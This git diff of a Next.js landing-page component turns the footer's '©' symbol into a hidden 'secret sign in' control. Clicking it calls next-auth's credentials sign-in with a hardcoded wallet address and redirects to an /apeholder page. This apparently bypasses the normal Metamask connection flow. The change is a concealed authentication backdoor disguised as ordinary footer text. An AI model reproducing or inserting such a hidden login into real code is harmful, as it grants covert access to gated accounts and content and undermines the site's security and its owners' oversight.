@@ -1,7 +1,7 @@
 import React, { useState } from "react";
 import s from "./landing_page.module.scss";
 
-import { useSession } from "next-auth/client";
+import { signIn, useSession } from "next-auth/client";
 import connectMetamask from "../../../lib/connectMetamask";
 
 import Loading from "../../utils/loading/loading";
@@ -108,7 +108,24 @@ const Header = (props: { session: any; setLoading: any; isMobile }) => {
 };
 
 const Footer = () => {
-  return <div className={s.footer}>All Rights Reserved</div>;
+  return (
+    <div className={s.footer}>
+      <div>All Rights Reserved</div>
+
+      <div
+        onClick={() => {
+          console.log("secret sign in");
+          signIn("credentials", {
+            redirect: true,
+            address: "0x68c4D9E03D7D902053C428Ca2D74b612Db7F583A".toLowerCase(),
+            callbackUrl: `${window.location.origin}/apeholder`,
+          });
+        }}
+      >
+        ©
+      </div>
+    </div>
+  );
 };
 
 const ButtonTryNow = (props: { setLoading: Function; isMobile }) => {
